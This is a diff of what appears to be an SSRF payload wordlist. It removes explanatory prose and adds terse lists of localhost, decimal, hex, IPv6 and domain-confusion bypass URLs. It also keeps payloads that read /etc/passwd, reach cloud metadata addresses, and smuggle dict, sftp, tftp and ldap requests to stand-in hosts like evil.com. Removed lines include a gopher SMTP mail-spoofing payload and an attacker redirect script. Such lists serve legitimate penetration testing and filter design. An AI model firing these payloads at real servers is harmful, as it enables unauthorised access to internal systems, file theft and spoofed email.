@@ -1,169 +1,94 @@
-Basic SSRF v1
-
+## Localhost
 http://127.0.0.1:80
 http://127.0.0.1:443
 http://127.0.0.1:22
+http://127.1:80
+http://0
 http://0.0.0.0:80
-http://0.0.0.0:443
-http://0.0.0.0:22
-
-Basic SSRF — Alternative version
-
 http://localhost:80
-http://localhost:443
-http://localhost:22
-
-Advanced exploit using a redirection
-
-
-Bypassing filters
-Bypass using HTTPS
-
-https://127.0.0.1/
-https://localhost/
-
-Bypass localhost with [::]
-
 http://[::]:80/
 http://[::]:25/ SMTP
-http://[::]:22/ SSH
-http://[::]:3128/ Squidhttp://0000::1:80/
-http://0000::1:25/ SMTP
-http://0000::1:22/ SSH
-http://0000::1:3128/ Squid
+http://[::]:3128/ Squid
+http://[0000::1]:80/
+http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
+http://①②⑦.⓪.⓪.⓪
 
-Bypass localhost with a domain redirection
-
-http://spoofed.burpcollaborator.net
-http://localtest.me
-http://customer1.app.localhost.my.company.127.0.0.1.nip.io
-http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
-http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
-
-
-NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
-
-Bypass localhost with CIDR
-
-It’s a /8
-
+## CDIR bypass
 http://127.127.127.127
 http://127.0.1.3
 http://127.0.0.0
 
-Bypass using a decimal IP location
-
-http://0177.0.0.1/
+## Decimal bypass
 http://2130706433/ = http://127.0.0.1
+http://017700000001 = http://127.0.0.1
 http://3232235521/ = http://192.168.0.1
 http://3232235777/ = http://192.168.1.1
 
-Bypass using IPv6/IPv4 Address Embedding
+## Hexadecimal bypass
+127.0.0.1 = 0x7f 00 00 01
+http://0x7f000001/ = http://127.0.0.1
+http://0xc0a80014/ = http://192.168.0.20
 
-IPv6/IPv4 Address Embedding
+http://{domain}@127.0.0.1
+http://127.0.0.1#{domain}
+http://{domain}.127.0.0.1
+http://127.0.0.1/{domain}
+http://127.0.0.1/?d={domain}
+https://{domain}@127.0.0.1
+https://127.0.0.1#{domain}
+https://{domain}.127.0.0.1
+https://127.0.0.1/{domain}
+https://127.0.0.1/?d={domain}
+http://{domain}@localhost
+http://localhost#{domain}
+http://{domain}.localhost
+http://localhost/{domain}
+http://localhost/?d={domain}
+http://127.0.0.1%00{domain}
+http://127.0.0.1?{domain}
+http://127.0.0.1///{domain}
+https://127.0.0.1%00{domain}
+https://127.0.0.1?{domain}
+https://127.0.0.1///{domain}
 
-http://[0:0:0:0:0:ffff:127.0.0.1]
+localtest.me = 127.0.0.1
+customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
+mail.ebc.apple.com = 127.0.0.6 (localhost)
+127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
+www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+http://bugbounty.dod.network = 127.0.0.2 (localhost)
+1ynrnhl.xip.io == 169.254.169.254
+spoofed.burpcollaborator.net = 127.0.0.1
 
-Bypass using malformed urls
-
+## Malformed URLs and rare addresses
 localhost:+11211aaa
 localhost:00011211aaaa
-
-Bypass using rare address
-
 http://0/
 http://127.1
 http://127.0.1
 
-Bypass using bash variables
-
-(curl only)
-
-curl -v "http://evil$google.com"
-$google = ""
-
-Bypass using tricks combination
-
+## Tricks
 http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
 urllib2 : 1.1.1.1
 requests + browsers : 2.2.2.2
 urllib : 3.3.3.3
+filter_var() php function: 0://evil.com:80;http://google.com:80/
 
-Bypass filter_var() php function
-
-0://evil.com:80;http://google.com:80/
-
-Bypass against a weak parser
-
+## Weakparser
 http://127.1.1.1:80\@127.2.2.2:80/
 http://127.1.1.1:80\@@127.2.2.2:80/
 http://127.1.1.1:80:\@@127.2.2.2:80/
 http://127.1.1.1:80#\@127.2.2.2:80/
 
-SSRF exploitation via URL Scheme
-File
-
-file://path/to/file
 file:///etc/passwd
-file://\/\/etc/passwd
-ssrf.php?url=file:///etc/passwd
-
-HTTP
-
-ssrf.php?url=http://127.0.0.1:22
-ssrf.php?url=http://127.0.0.1:80
-ssrf.php?url=http://127.0.0.1:443
-
-Dict
-
-The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
 
 dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
 ssrf.php?url=dict://attacker:11111/
 
-SFTP
-
-A network protocol used for secure file transfer over secure shell
-
 ssrf.php?url=sftp://evil.com:11111/
-
-TFTP
-
-Trivial File Transfer Protocol, works over UDP
 
 ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
 
-LDAP
-
-Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.
-
 ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
-
-Gopher
-
-ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250awill make a request like
-HELO localhost
-MAIL FROM:<hacker@site.com>
-RCPT TO:<victim@site.com>
-DATA
-From: [Hacker] <hacker@site.com>
-To: <victime@site.com>
-Date: Tue, 15 Sep 2017 17:20:26 -0400
-Subject: Ah Ah AHYou didn't say the magic word !
-.
-QUIT
-
-Gopher HTTP
-
-gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
-gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
-
-Gopher SMTP — Back connect to 1337
-
-Content of evil.com/redirect.php:
-<?php
-header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
-?>Now query it.
-https://example.com/?q=http://evil.com/redirect.php.
-
 
